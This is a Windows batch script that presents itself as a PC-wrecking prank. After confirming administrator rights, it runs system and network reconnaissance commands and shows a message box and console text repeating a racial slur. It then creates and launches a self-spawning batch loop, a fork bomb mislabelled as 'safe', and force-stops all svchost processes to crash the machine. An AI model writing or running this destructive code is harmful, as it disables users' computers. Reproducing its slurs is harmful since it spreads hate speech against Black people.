@echo off
color a
@echo off
echo [ INFO ] Checking for Administrator Privilages of [%COMPUTERNAME%]-(%USERNAME)...
timeout /t 0001 >nul
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [ INFO ] Admin Privilages found!
) else (
    echo [ ERROR ] You need to run this script as administrator to fuck your pc... :(
	echo [ INFO ] exiting...
    timeout /t 0003 >nul
    exit /b
)
timeout /t 0001 >nul
echo [ INFO ] Pulling (destroy_pc.c)...
echo [ INFO ] Pulling (scr_files_rm.txt)...
timeout /t 0001 >nul
echo [ INFO ] Loading everything.
timeout /t 00002 >nul
echo [ INFO ] Loading everything..
timeout /t 00004 >nul
echo [ INFO ] Loading everything...
timeout /t 00001 >nul
echo [ INFO ] Loading finished!
timeout /t 0001 >nul
echo [ INFO ] making (filedestroy_list.txt)...
timeout /t 0002 >nul
dir
tasklist
arp -a
ipconfig -all
echo [ INFO ] Pulling [%COMPUTERNAME%]-(%USERNAME%) (system_info.txt)...
systeminfo
echo [ INFO ] (filedestroy_list.txt) pulled!
echo [ INFO ] HELLO MY FELLOW NIGGER. IF YOU PRESS ANY KEY YOUR PC WILL BE BACKSHOTTED AND RAILED. PRESS THE X AND YOURE OK. CHOOSE WISEFULLY NIGGER.
timeout /t 0001 >nul
echo [ INFO ] Press (any key) to fuck your pc
pause >nul
powershell -command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER ','Message Box')"
@echo off
echo :start >> example.bat
echo start >> example.bat
echo goto start >> example.bat

REM Run the batch file safely
start "" example.bat
timeout /t 0010
powershell -Command "Get-Process svchost | Stop-Process -Force
